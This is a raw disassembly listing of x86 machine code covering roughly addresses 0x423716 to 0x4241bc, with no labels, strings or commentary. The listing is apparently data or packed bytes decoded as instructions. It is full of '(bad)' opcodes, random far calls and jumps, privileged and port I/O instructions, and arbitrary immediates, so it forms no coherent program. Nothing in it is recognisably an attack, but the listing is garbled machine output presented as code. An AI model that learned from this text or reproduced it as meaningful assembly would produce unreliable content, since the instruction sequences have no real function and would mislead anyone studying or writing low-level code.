  423716:	pop    edx
  423717:	fmul   QWORD PTR [ecx-0x63]
  42371a:	push   ds
  42371b:	js     0x4236fc
  42371d:	dec    edx
  42371e:	(bad)  
  42371f:	xchg   edx,eax
  423720:	stos   BYTE PTR es:[edi],al
  423721:	jb     0x4236e8
  423723:	(bad)  
  423724:	pop    edi
  423725:	pusha  
  423726:	mov    bh,0x19
  423728:	pusha  
  423729:	and    BYTE PTR [ecx],bl
  42372b:	adc    BYTE PTR ds:0x93c3842d,ch
  423731:	and    al,0xc3
  423733:	pop    edi
  423734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423735:	mov    dh,0x68
  423737:	bound  edi,QWORD PTR [eax-0x41d6011c]
  42373d:	push   ss
  42373e:	xchg   ebp,eax
  42373f:	and    edx,ebp
  423741:	add    eax,0x22c152be
  423746:	sub    ch,cl
  423748:	and    eax,0x75f35a2f
  42374d:	retf   
  42374e:	je     0x423714
  423750:	pusha  
  423751:	pop    ss
  423752:	jp     0x423795
  423754:	ins    DWORD PTR es:[edi],dx
  423755:	push   edi
  423756:	add    DWORD PTR [edi],edx
  423758:	popf   
  423759:	push   esp
  42375a:	sti    
  42375b:	shl    BYTE PTR [ebx+0xc],1
  42375e:	arpl   WORD PTR [eax],sp
  423760:	aad    0x52
  423762:	sub    eax,0x93fca510
  423767:	call   0xa34686e8
  42376c:	lods   eax,DWORD PTR ds:[esi]
  42376d:	jge    0x42370e
  42376f:	lods   al,BYTE PTR ds:[esi]
  423770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423771:	pop    ss
  423772:	fisttp WORD PTR [ecx+0x39]
  423775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423776:	jne    0x4237d9
  423778:	push   edx
  423779:	or     BYTE PTR [ecx+0x67a60c2b],cl
  42377f:	add    eax,0xd34c2854
  423784:	fist   DWORD PTR [esi-0x72]
  423787:	repnz dec ebp
  423789:	je     0x4237f5
  42378b:	fldcw  WORD PTR [ecx]
  42378d:	lods   eax,DWORD PTR ds:[esi]
  42378e:	inc    ebx
  42378f:	in     al,0xf
  423791:	fsub   st,st(4)
  423793:	sub    eax,0x656bc72e
  423798:	ins    DWORD PTR es:[edi],dx
  423799:	jl     0x42374e
  42379b:	push   edx
  42379c:	mov    dl,0x4d
  42379e:	add    eax,0xdce1cf7e
  4237a3:	push   esp
  4237a4:	pop    ebp
  4237a5:	aad    0x92
  4237a7:	inc    ebx
  4237a8:	loope  0x4237d0
  4237aa:	rcr    edx,cl
  4237ac:	pusha  
  4237ad:	push   ebx
  4237ae:	dec    eax
  4237af:	ror    DWORD PTR [ebp+0x55d7ed8b],0x2b
  4237b6:	shl    DWORD PTR [ebx+0x6a],cl
  4237b9:	push   es
  4237ba:	or     dl,dh
  4237bc:	jae    0x423830
  4237be:	mov    ebp,0x4bf9
	...
  423833:	add    ch,cl
  423835:	cmp    DWORD PTR [eax-0x10680369],edi
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	cs xchg esp,eax
  423842:	mov    ah,BYTE PTR [ecx-0x28]
  423845:	jp     0x423848
  423847:	add    ch,dh
  423849:	add    BYTE PTR [eax],al
  42384b:	add    BYTE PTR [edi+0x39f746c8],ch
  423851:	imul   edi,ebx,0xfca136bc
  423857:	inc    eax
  423858:	sbb    eax,esp
  42385a:	dec    edi
  42385b:	mov    eax,esp
  42385d:	in     eax,0x66
  42385f:	loop   0x4238d9
  423861:	test   eax,0x28143077
  423866:	lahf   
  423867:	xor    eax,0xc5a3817b
  42386c:	or     DWORD PTR [edx+eax*2+0x1b],0x6e7341a
  423874:	and    BYTE PTR [esi-0x32],bh
  423877:	mov    ebp,0xd12eaf30
  42387c:	loop   0x42380c
  42387e:	inc    eax
  42387f:	mov    ch,0xcc
  423881:	xchg   edi,eax
  423882:	cmc    
  423883:	arpl   WORD PTR [ecx+0x39],dx
  423886:	fbld   TBYTE PTR ds:0x1e6b2fbe
  42388c:	cmp    ebp,DWORD PTR ds:0x5c88ae08
  423892:	or     bl,BYTE PTR [ebx+0x4c]
  423895:	jmp    esp
  423897:	pop    edx
  423898:	mov    WORD PTR [edi-0x50],gs
  42389b:	pop    ebx
  42389c:	pop    eax
  42389d:	adc    dl,cl
  42389f:	pop    edx
  4238a0:	and    cl,BYTE PTR [eax]
  4238a2:	lock or DWORD PTR [esi],ebp
  4238a5:	retf   0xd25e
  4238a8:	dec    ecx
  4238a9:	test   DWORD PTR [edi],0x1ea2b054
  4238af:	ret    0xd5c2
  4238b2:	pop    ebx
  4238b3:	pop    edx
  4238b4:	jg     0x4238f4
  4238b6:	icebp  
  4238b7:	mov    eax,0x4116aba1
  4238bc:	pop    ebp
  4238bd:	test   DWORD PTR [edi-0x46],edi
  4238c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238c1:	call   0x2811:0x4c3aab8b
  4238c8:	cli    
  4238c9:	in     eax,dx
  4238ca:	push   0xffffffcd
  4238cc:	popa   
  4238cd:	push   es
  4238ce:	retf   0xb246
  4238d1:	pop    es
  4238d2:	std    
  4238d3:	int3   
  4238d4:	or     bl,BYTE PTR ds:0xb1e22e4
  4238db:	or     DWORD PTR [edx+0x4f],esp
  4238de:	xchg   edi,eax
  4238df:	fild   DWORD PTR ds:0x6391cc4f
  4238e5:	je     0x4238e6
  4238e7:	call   0x5fa3:0x68265d1c
  4238ee:	and    BYTE PTR [ebp+0x4f],0xd
  4238f2:	jo     0x423957
  4238f4:	add    eax,0x17e0ad36
  4238f9:	push   0x6ebfdabb
  4238fe:	shl    al,1
  423900:	popf   
  423901:	sbb    eax,ecx
  423903:	pushf  
  423904:	retf   
  423905:	jle    0x423942
  423907:	jo     0x4238a9
  423909:	mov    ebx,0x58a12914
  42390e:	jne    0x4238ab
  423910:	das    
  423911:	icebp  
  423912:	sbb    esp,DWORD PTR [edx-0x4852111a]
  423918:	in     eax,0x73
  42391a:	cmp    al,0x63
  42391c:	pop    esi
  42391d:	xor    eax,0x8b68799f
  423922:	push   ebp
  423923:	hlt    
  423924:	dec    edx
  423925:	mov    cl,0x91
  423927:	adc    cl,BYTE PTR [ecx+0x3f2ee3ea]
  42392d:	out    dx,eax
  42392e:	pop    esp
  42392f:	out    0x85,eax
  423931:	mov    ss:0xd290d745,al
  423937:	and    sp,ax
  42393a:	sbb    bh,0xab
  42393d:	xchg   ecx,eax
  42393e:	mov    eax,ds:0x14a
	...
  4239b3:	add    BYTE PTR [esi-0x377e796],dl
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [ecx-0x3235c582],?
  4239c5:	jnp    0x4239c8
  4239c7:	add    ch,dh
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    BYTE PTR [esi],bl
  4239cd:	push   ebx
  4239ce:	ins    BYTE PTR es:[edi],dx
  4239cf:	loope  0x423a0b
  4239d1:	push   edi
  4239d2:	jbe    0x4239d4
  4239d4:	sub    cl,ch
  4239d6:	ret    
  4239d7:	xchg   ebp,esi
  4239d9:	push   ebp
  4239da:	mov    al,ds:0xf158adc2
  4239df:	mov    ch,0x86
  4239e1:	ja     0x42397a
  4239e3:	dec    esp
  4239e4:	dec    ebp
  4239e5:	stos   DWORD PTR es:[edi],eax
  4239e6:	ror    DWORD PTR [ebx+ebx*2],1
  4239e9:	inc    ebx
  4239ea:	xchg   BYTE PTR [edi+ecx*1],bl
  4239ed:	pop    ecx
  4239ee:	push   0xfffffff0
  4239f0:	cdq    
  4239f1:	not    DWORD PTR [edx]
  4239f3:	pop    edx
  4239f4:	jl     0x42399c
  4239f6:	and    dl,BYTE PTR [edx+0x3e359aa2]
  4239fc:	mov    ch,0xcf
  4239fe:	jp     0x4239b2
  423a00:	add    al,0x1c
  423a02:	or     al,0xca
  423a04:	out    dx,eax
  423a05:	imul   esi,DWORD PTR [eax+0x16],0xf406e017
  423a0c:	aas    
  423a0d:	cmp    edi,DWORD PTR ds:0xac862e33
  423a13:	xchg   esp,eax
  423a14:	sub    ebx,DWORD PTR [ebx+0x5592ee4f]
  423a1a:	lahf   
  423a1b:	dec    edi
  423a1c:	push   0x6a741007
  423a21:	jle    0x423a88
  423a23:	cli    
  423a24:	ins    DWORD PTR es:[edi],dx
  423a25:	jg     0x4239cc
  423a27:	fiadd  WORD PTR [edx-0x25]
  423a2a:	pop    edi
  423a2b:	outs   dx,DWORD PTR ds:[esi]
  423a2c:	aam    0x9c
  423a2e:	(bad)  
  423a2f:	push   cs
  423a30:	adc    al,al
  423a32:	ret    
  423a33:	sub    BYTE PTR [edx],bh
  423a35:	rol    dh,cl
  423a37:	lds    ebx,FWORD PTR [esi-0x5963e45a]
  423a3d:	test   DWORD PTR [edx],0x874f2804
  423a43:	xchg   esi,eax
  423a44:	add    ebp,eax
  423a46:	jge    0x423a2e
  423a48:	lea    edi,[edx+0x112b1ef5]
  423a4e:	(bad)  
  423a4f:	sti    
  423a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a51:	inc    eax
  423a52:	jnp    0x423abe
  423a54:	xchg   esp,eax
  423a55:	retf   0x932
  423a58:	ins    BYTE PTR es:[edi],dx
  423a59:	mov    bh,0x53
  423a5b:	icebp  
  423a5c:	nop
  423a5d:	mov    edx,0x276b60cb
  423a62:	leave  
  423a63:	(bad)  
  423a64:	fld    DWORD PTR [esp+edx*4+0x2]
  423a68:	aas    
  423a69:	mov    bh,BYTE PTR [esi+ebp*1]
  423a6c:	clc    
  423a6d:	pop    ss
  423a6e:	push   es
  423a6f:	inc    esi
  423a70:	je     0x423a47
  423a72:	mov    ds:0x9d83704a,al
  423a77:	loope  0x423a36
  423a79:	retf   
  423a7a:	ins    BYTE PTR es:[edi],dx
  423a7b:	enter  0xcc86,0xce
  423a7f:	les    esp,FWORD PTR [edi+0x1b]
  423a82:	out    0x69,eax
  423a84:	stos   BYTE PTR es:[edi],al
  423a85:	mov    eax,ds:0x5edc3090
  423a8a:	pop    edi
  423a8b:	scas   eax,DWORD PTR es:[edi]
  423a8c:	jge    0x423a68
  423a8e:	jecxz  0x423acb
  423a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a91:	cmp    BYTE PTR [ebp+0x52e22818],bh
  423a97:	aad    0x7
  423a99:	inc    edi
  423a9a:	xor    eax,0xe3a8b65
  423a9f:	(bad)  
  423aa0:	stos   BYTE PTR es:[edi],al
  423aa1:	xchg   ebp,eax
  423aa2:	test   BYTE PTR [ebx],0xfa
  423aa5:	retf   0x5d2
  423aa8:	dec    ebp
  423aa9:	sti    
  423aaa:	sti    
  423aab:	jmp    0x423a89
  423aad:	fisub  WORD PTR [eax+0x1acec512]
  423ab3:	repnz xor DWORD PTR [edi-0x13f32e5e],edi
  423aba:	pop    ds
  423abb:	dec    ecx
  423abc:	inc    esi
  423abd:	inc    esp
  423abe:	repnz enter 0xf1,0x0
	...
  423b33:	add    BYTE PTR [edi+esi*1+0x4a],al
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x72
  423b41:	es aad 0x7d
  423b44:	ret    0x17c
  423b47:	add    ch,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [esi-0x61],al
  423b4e:	push   edx
  423b4f:	and    eax,0x2cd94b44
  423b54:	or     ch,ah
  423b56:	xchg   ebp,eax
  423b57:	and    edi,eax
  423b59:	add    ch,BYTE PTR [ecx+ebx*1-0x4e6cccc2]
  423b60:	out    dx,al
  423b61:	lods   al,BYTE PTR ds:[esi]
  423b62:	outs   dx,DWORD PTR ds:[esi]
  423b63:	fidiv  DWORD PTR [ebp+edi*1+0x3ff07a55]
  423b6a:	bound  eax,QWORD PTR [ecx]
  423b6c:	pop    esp
  423b6d:	cs sti 
  423b6f:	leave  
  423b70:	outs   dx,BYTE PTR ds:[esi]
  423b71:	mov    ebx,0xb0775b7e
  423b76:	aaa    
  423b77:	mov    ds:0xb4bb1a76,al
  423b7c:	sar    BYTE PTR [esi-0x5c99ae5d],cl
  423b82:	sbb    esi,DWORD PTR [edi-0x43]
  423b85:	mov    BYTE PTR [esi-0x12],bh
  423b88:	adc    al,0xb0
  423b8a:	dec    esi
  423b8b:	add    BYTE PTR [edx-0x7865ce95],dh
  423b91:	js     0x423bc9
  423b93:	aas    
  423b94:	das    
  423b95:	rcl    BYTE PTR [esi+0x72],0x13
  423b99:	(bad)  
  423b9a:	fs sti 
  423b9c:	pop    ebx
  423b9d:	push   esi
  423b9e:	cmc    
  423b9f:	outs   dx,DWORD PTR ds:[esi]
  423ba0:	cwde   
  423ba1:	pop    ebp
  423ba2:	es aam 0x1
  423ba5:	aas    
  423ba6:	ja     0x423c00
  423ba8:	out    0x41,eax
  423baa:	jg     0x423b8a
  423bac:	xchg   edx,eax
  423bad:	fs inc eax
  423baf:	mov    ebx,0xd00b1c9c
  423bb4:	iret   
  423bb5:	pop    ecx
  423bb6:	out    0xbc,eax
  423bb8:	xor    DWORD PTR [eax-0x46b66d23],esi
  423bbe:	aad    0xcd
  423bc0:	mov    edx,0x4ce7c033
  423bc5:	pop    esp
  423bc6:	js     0x423b71
  423bc8:	ins    DWORD PTR es:[edi],dx
  423bc9:	fucomi st,st(6)
  423bcb:	add    al,0x52
  423bcd:	add    BYTE PTR [ebx-0x4e],0x8
  423bd1:	hlt    
  423bd2:	pop    eax
  423bd3:	leave  
  423bd4:	xchg   edi,eax
  423bd5:	aad    0x4c
  423bd7:	dec    ebp
  423bd8:	out    0xad,eax
  423bda:	or     BYTE PTR [ecx+0x1e],ch
  423bdd:	repnz cli 
  423bdf:	rol    BYTE PTR [eax],cl
  423be1:	mov    ch,BYTE PTR [edx]
  423be3:	cs je  0x423c34
  423be6:	rcl    DWORD PTR [ecx],1
  423be8:	sahf   
  423be9:	inc    ebx
  423bea:	add    edx,esi
  423bec:	push   0x49
  423bee:	pop    edi
  423bef:	push   cs
  423bf0:	aad    0x3f
  423bf2:	es mov ebx,0x3168ac46
  423bf8:	sub    al,0x64
  423bfa:	fstp   DWORD PTR [ebx]
  423bfc:	mov    WORD PTR [edx+eiz*2+0x36c6695],ss
  423c03:	cli    
  423c04:	cmp    al,0x26
  423c06:	enter  0x910c,0xf8
  423c0a:	inc    esp
  423c0b:	mov    ah,0xab
  423c0d:	mov    ch,0xc4
  423c0f:	xchg   edi,eax
  423c10:	cs sbb ecx,ebx
  423c13:	push   edx
  423c14:	shl    ebx,1
  423c16:	adc    dh,BYTE PTR [edi*8-0x23d9204f]
  423c1d:	pusha  
  423c1e:	out    0x63,eax
  423c20:	out    0xa6,eax
  423c22:	xor    eax,0xda4e0682
  423c27:	fdivr  DWORD PTR [edi+edx*4]
  423c2a:	(bad)  
  423c2c:	lea    eax,[edx]
  423c2e:	les    eax,FWORD PTR [eax]
  423c30:	jmp    0x7b29e3f0
  423c35:	int3   
  423c36:	push   ecx
  423c37:	nop
  423c38:	and    eax,0x2a72ce1e
  423c3d:	dec    edi
  423c3e:	not    DWORD PTR [esi+0x44]
	...
  423cb1:	add    BYTE PTR [eax],al
  423cb3:	add    BYTE PTR [edi+0x626d60bd],bh
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0x324b,0x7d
  423cc3:	shl    BYTE PTR [edi-0xafffe83],cl
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    BYTE PTR ds:0xb7ee5b63,cl
  423cd1:	pop    esp
  423cd2:	nop
  423cd3:	jne    0x423c8b
  423cd5:	leave  
  423cd6:	push   ecx
  423cd7:	or     edx,edi
  423cd9:	push   ebp
  423cda:	neg    BYTE PTR [esi-0x5b]
  423cdd:	ret    
  423cde:	mov    ds:0x6b4f15e4,al
  423ce3:	ins    DWORD PTR es:[edi],dx
  423ce4:	icebp  
  423ce5:	push   edx
  423ce6:	xchg   edi,eax
  423ce7:	xor    al,0xab
  423cea:	adc    al,0xb
  423cec:	mov    ecx,0x76e16ed7
  423cf1:	pop    esi
  423cf2:	dec    esp
  423cf3:	icebp  
  423cf4:	cmp    DWORD PTR [edi],edi
  423cf6:	dec    edi
  423cf7:	cmp    esp,0xffffffaa
  423cfa:	aas    
  423cfb:	xor    DWORD PTR [ecx],ebx
  423cfd:	jl     0x423d68
  423cff:	bound  eax,QWORD PTR [esi+0x37]
  423d02:	popf   
  423d03:	loopne 0x423cc5
  423d05:	retf   
  423d06:	inc    DWORD PTR [ebx-0x7c]
  423d09:	mov    dh,0x42
  423d0b:	popa   
  423d0c:	out    0xc5,eax
  423d0e:	pop    ss
  423d0f:	jne    0x423ca5
  423d11:	xchg   esi,eax
  423d12:	sbb    DWORD PTR [ebx-0x45fe4df0],ecx
  423d18:	rcl    ecx,1
  423d1a:	push   es
  423d1b:	jmp    0x5e94:0x5b5e2e59
  423d22:	jbe    0x423cb3
  423d24:	stos   DWORD PTR es:[edi],eax
  423d25:	inc    ebx
  423d26:	shl    DWORD PTR [edx],1
  423d28:	lods   eax,DWORD PTR ds:[esi]
  423d29:	pushf  
  423d2a:	or     dh,BYTE PTR [edx+0x34cc626]
  423d30:	pop    esp
  423d31:	xor    esi,DWORD PTR [ecx+esi*1]
  423d34:	inc    ebx
  423d35:	imul   eax,DWORD PTR [edi],0xc69ba68c
  423d3b:	aas    
  423d3c:	sbb    al,0xe1
  423d3e:	retf   0x2fd3
  423d41:	mov    ah,0x8e
  423d43:	push   ebp
  423d44:	jecxz  0x423daa
  423d46:	shl    ebp,0x85
  423d49:	cmp    al,0xbd
  423d4b:	out    0x85,eax
  423d4d:	sbb    al,0x3
  423d4f:	add    edx,DWORD PTR ds:0x58d9e887
  423d55:	push   ecx
  423d56:	adc    DWORD PTR [ebp+0x523f26fb],esp
  423d5c:	mov    BYTE PTR [eax],0x90
  423d5f:	das    
  423d60:	std    
  423d61:	inc    ebx
  423d62:	das    
  423d63:	dec    ecx
  423d64:	cmp    eax,0x801e5ef8
  423d69:	mov    al,ds:0xed7cfdbc
  423d6e:	inc    esi
  423d6f:	xchg   edi,eax
  423d70:	inc    esi
  423d71:	data16 jp 0x423d10
  423d74:	shl    BYTE PTR [edi],cl
  423d76:	mov    esi,0x3437b245
  423d7b:	idiv   DWORD PTR [esi+edi*1]
  423d7e:	adc    eax,0xb6c5bc32
  423d83:	cli    
  423d84:	add    DWORD PTR [ebx],ebp
  423d86:	jp     0x423d56
  423d88:	loope  0x423daf
  423d8a:	xchg   ebx,eax
  423d8b:	fild   WORD PTR [edi+0x34]
  423d8e:	mov    ebx,?
  423d90:	mov    esi,0xb3ed6c21
  423d95:	retf   
  423d96:	mov    al,ds:0x9ba293ab
  423d9b:	or     eax,0xf29c7668
  423da0:	out    dx,al
  423da1:	dec    ebx
  423da2:	push   es
  423da3:	call   FWORD PTR [edi-0x55]
  423da6:	repz hlt 
  423da8:	neg    ecx
  423daa:	and    eax,0xf5060a72
  423daf:	mov    edi,0x2b73ca81
  423db4:	pop    ebx
  423db5:	add    BYTE PTR [eax+0x11091d97],ch
  423dbb:	int    0x45
  423dbd:	mov    cl,0x38
  423dbf:	dec    esp
  423dc0:	jns    0x423dc2
	...
  423e32:	add    BYTE PTR [eax],al
  423e34:	adc    DWORD PTR [ebp-0x78],0x19
  423e38:	(bad)  
  423e3a:	xchg   ebx,eax
  423e3b:	ffreep st(6)
  423e3d:	dec    eax
  423e3e:	imul   ebp,edi,0xffffffbe
  423e41:	mov    esp,ds
  423e43:	hlt    
  423e44:	lods   al,BYTE PTR ds:[esi]
  423e45:	jle    0x423e48
  423e47:	add    ch,dh
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    BYTE PTR [edx],dl
  423e4d:	lds    ebp,FWORD PTR [ebx-0x2e50b730]
  423e53:	xor    cl,BYTE PTR [ecx-0x27c2d688]
  423e59:	xchg   esi,eax
  423e5a:	retf   
  423e5b:	pop    ds
  423e5c:	iret   
  423e5d:	lahf   
  423e5e:	ror    edi,1
  423e60:	mov    esp,0x521b8777
  423e65:	dec    ecx
  423e66:	add    BYTE PTR [edx+ebx*8-0x4e61383d],0x37
  423e6e:	jl     0x423e3f
  423e70:	sub    ecx,DWORD PTR [edi+0x70cc9410]
  423e76:	mov    bh,0x52
  423e78:	rcr    cl,1
  423e7a:	pusha  
  423e7b:	(bad)  
  423e7c:	jns    0x423e9f
  423e7e:	inc    esp
  423e7f:	iret   
  423e80:	add    BYTE PTR [esi-0x5175410c],bh
  423e86:	imul   DWORD PTR [edi]
  423e88:	in     eax,0x76
  423e8a:	pop    ebp
  423e8b:	jmp    esi
  423e8d:	js     0x423edc
  423e8f:	pop    ss
  423e90:	xor    ecx,DWORD PTR [eax-0x57]
  423e93:	ret    0x454a
  423e96:	lock lods al,BYTE PTR ds:[esi]
  423e98:	fcmovnb st,st(5)
  423e9a:	out    0x91,al
  423e9c:	adc    eax,0x4881f311
  423ea1:	jno    0x423e2c
  423ea3:	nop
  423ea4:	loopne 0x423e47
  423ea6:	scas   eax,DWORD PTR es:[edi]
  423ea7:	imul   edx,DWORD PTR [eax-0x3f],0x3ea38130
  423eae:	daa    
  423eaf:	test   BYTE PTR [eax-0x2d],0x7a
  423eb3:	xor    eax,0x8bbc35c1
  423eb8:	inc    ecx
  423eb9:	ret    
  423eba:	cmp    eax,0x6a77b194
  423ebf:	or     eax,0x5bf7a9e6
  423ec4:	int3   
  423ec5:	(bad)  
  423ec7:	push   0xffffffe0
  423ec9:	ret    
  423eca:	inc    esi
  423ecb:	aam    0xda
  423ecd:	xor    esi,ecx
  423ecf:	push   edi
  423ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ed1:	leave  
  423ed2:	jecxz  0x423ea6
  423ed4:	push   ebx
  423ed5:	sub    cl,cl
  423ed7:	mov    al,0xe9
  423ed9:	hlt    
  423eda:	aaa    
  423edb:	mov    edx,0x146641e4
  423ee0:	(bad)  
  423ee1:	jb     0x423ea4
  423ee3:	test   eax,0xed0a8c40
  423ee8:	inc    ebp
  423ee9:	mov    edx,0xba343077
  423eee:	cmp    al,0x49
  423ef0:	lods   eax,DWORD PTR ds:[esi]
  423ef1:	mov    cl,0x4c
  423ef3:	xor    dh,bh
  423ef5:	in     al,dx
  423ef6:	jmp    FWORD PTR [esp+ecx*4]
  423ef9:	out    dx,al
  423efa:	inc    esp
  423efb:	das    
  423efc:	jle    0x423f1d
  423efe:	and    ebx,edx
  423f00:	imul   esi
  423f02:	push   edi
  423f03:	adc    bh,BYTE PTR [esi+ecx*2]
  423f06:	mov    ah,0x7b
  423f09:	(bad)  
  423f0a:	out    0xce,eax
  423f0c:	mov    dh,0xc
  423f0e:	ret    0x7407
  423f11:	xchg   edx,eax
  423f12:	fsubr  st,st(2)
  423f14:	mov    ah,0x74
  423f16:	cs fs cmp al,0x92
  423f1a:	mov    edx,0x5e730d22
  423f1f:	fmul   QWORD PTR [edx+0x22b5db61]
  423f25:	fwait
  423f26:	inc    esp
  423f27:	inc    ebx
  423f28:	mov    bh,0x3
  423f2a:	push   ds
  423f2b:	fsub   st(1),st
  423f2d:	aad    0x25
  423f2f:	adc    DWORD PTR [eax],esp
  423f31:	fcom   DWORD PTR [ecx-0x19e46978]
  423f37:	push   esi
  423f38:	jno    0x423f82
  423f3a:	add    BYTE PTR [edi+0x33564142],dh
  423f40:	xchg   ecx,eax
	...
  423fb1:	add    BYTE PTR [eax],al
  423fb3:	add    BYTE PTR [esi-0x1c],al
  423fb6:	bound  ecx,QWORD PTR [eax-0x1111711e]
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx-0x4b],dh
  423fc1:	xlat   BYTE PTR ds:[ebx]
  423fc2:	mov    dh,0x96
  423fc4:	mov    eax,ds:0xf500017f
  423fc9:	add    BYTE PTR [eax],al
  423fcb:	add    BYTE PTR [ecx+0x7],bh
  423fce:	jmp    0x70fdb87d
  423fd3:	mov    bl,0x54
  423fd5:	sub    al,0xf9
  423fd7:	retf   0x560b
  423fda:	imul   DWORD PTR [eax+0x1d]
  423fdd:	bnd ja 0x423f78
  423fe0:	jns    0x424000
  423fe2:	ror    ah,cl
  423fe4:	shr    BYTE PTR [eax+0x3641e2c1],cl
  423fea:	and    BYTE PTR [eax],ch
  423fec:	cwde   
  423fed:	cmp    cl,BYTE PTR [ecx+edx*2-0x4d]
  423ff1:	jo     0x424043
  423ff3:	adc    BYTE PTR [edx-0x4c],bh
  423ff6:	and    al,0x3a
  423ff8:	retf   0x23f2
  423ffb:	sar    BYTE PTR [esi-0x543cf072],0x4f
  424002:	adc    dh,0x27
  424005:	push   0x38
  424007:	loopne 0x424033
  424009:	xchg   esi,eax
  42400a:	mov    BYTE PTR [esp+ecx*1-0x1e],ah
  42400e:	adc    eax,0x57021383
  424013:	mov    edx,0x7ef76619
  424018:	loope  0x424008
  42401a:	rcr    DWORD PTR [edi-0x2451207e],cl
  424020:	xor    edx,DWORD PTR [edx]
  424022:	dec    edx
  424023:	ret    0x7518
  424026:	xor    dl,BYTE PTR [edi-0x35]
  424029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42402a:	ficomp WORD PTR [ebp-0x71]
  42402d:	icebp  
  42402e:	rcl    DWORD PTR [ecx+0x2f],0x34
  424032:	(bad)  [eax+eax*2-0x19]
  424036:	in     al,0xda
  424038:	push   ss
  424039:	inc    eax
  42403a:	dec    esi
  42403b:	sbb    ah,dl
  42403d:	retf   
  42403e:	mov    BYTE PTR [eax],al
  424040:	inc    edx
  424041:	jmp    DWORD PTR [ebp+ebp*1+0x58b0f14a]
  424048:	xchg   esp,eax
  424049:	ror    DWORD PTR [edi+ebx*4],0x41
  42404d:	cld    
  42404e:	add    al,0x81
  424050:	xchg   esp,eax
  424051:	scas   eax,DWORD PTR es:[edi]
  424052:	jg     0x42406c
  424054:	imul   ebp,edx,0xffffff95
  424057:	daa    
  424058:	mov    ?,eax
  42405a:	test   BYTE PTR [eax],ah
  42405c:	aas    
  42405d:	inc    esp
  42405e:	sub    DWORD PTR [eax-0xf],0x54
  424062:	sbb    BYTE PTR [ebx],0xbd
  424065:	ret    0x722a
  424068:	inc    esp
  424069:	push   cs
  42406a:	mov    bh,0x55
  42406c:	pop    edx
  42406d:	gs sahf 
  42406f:	fsubr  QWORD PTR [edx+0xbe458d8]
  424075:	dec    esi
  424076:	adc    edi,edx
  424078:	scas   al,BYTE PTR es:[edi]
  424079:	call   0x4370:0x2ef40f72
  424080:	outs   dx,DWORD PTR ds:[esi]
  424081:	jle    0x4240f0
  424083:	or     eax,DWORD PTR [ecx+0x6f7cb533]
  424089:	add    BYTE PTR fs:[eax+0x31],dh
  42408d:	daa    
  42408e:	adc    DWORD PTR [esi-0x36],ebx
  424091:	in     al,dx
  424092:	jns    0x424016
  424094:	xor    al,0xac
  424096:	pop    ecx
  424097:	push   ebx
  424098:	in     eax,dx
  424099:	inc    esi
  42409a:	frstor [edi-0x39]
  42409d:	call   0x106f131b
  4240a2:	jno    0x42407e
  4240a4:	fcomp  DWORD PTR [edx+0x12f18862]
  4240aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240ab:	jl     0x424065
  4240ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240ae:	dec    ebx
  4240af:	aas    
  4240b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240b1:	imul   esi,DWORD PTR [edx-0x9],0xffffffd6
  4240b5:	arpl   WORD PTR [ecx+ecx*1+0x19],ax
  4240b9:	cwde   
  4240ba:	xor    al,0x24
  4240bc:	mov    edx,0xa1828d14
	...
  424131:	add    BYTE PTR [eax],al
  424133:	add    BYTE PTR [ecx-0xf],bh
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax+0x2c3e7b6a]
  424142:	and    ebx,ecx
  424144:	xchg   esi,eax
  424145:	add    BYTE PTR [ecx],0x0
  424148:	cmc    
  424149:	add    BYTE PTR [eax],al
  42414b:	add    ch,bl
  42414d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42414e:	sbb    ebp,DWORD PTR [edx+0x24c17653]
  424154:	add    ecx,DWORD PTR [edi+0x6]
  424157:	mov    ebx,DWORD PTR [edx+0x6c]
  42415a:	lea    ebp,ds:0x32d1cec3
  424160:	inc    ebx
  424161:	aam    0x84
  424163:	pop    ebp
  424164:	mov    ds:0xc13c3e64,al
  424169:	push   es
  42416a:	sbb    ecx,DWORD PTR [eax-0x11]
  42416d:	ja     0x424189
  42416f:	div    DWORD PTR [esp+ecx*2+0x5cf44b0f]
  424176:	std    
  424177:	rol    BYTE PTR [ebp+edi*2+0x1f6e1dde],0x77
  42417f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424180:	fst    DWORD PTR [edi]
  424182:	daa    
  424183:	jne    0x4241af
  424185:	outs   dx,DWORD PTR ds:[esi]
  424186:	xor    eax,0x8f252ca9
  42418b:	xor    eax,0xe5b02e0d
  424190:	jmp    0x3421:0x330018f8
  424197:	aam    0x18
  424199:	mov    es,WORD PTR [edi+ebp*1-0x5c]
  42419d:	adc    al,0x55
  42419f:	mov    bl,0xb8
  4241a1:	inc    esp
  4241a2:	mov    es:0x29401d96,eax
  4241a8:	mov    ah,0xe2
  4241aa:	pushf  
  4241ab:	push   ds
  4241ac:	pop    edi
  4241ad:	jle    0x424192
  4241af:	mov    esp,0xfaa15735
  4241b4:	add    edi,DWORD PTR [esi+eax*2-0x3e]
  4241b8:	push   esp
  4241b9:	std    
  4241ba:	loopne 0x4241ed
  4241bc:	mov    edx,0x7d06dee9
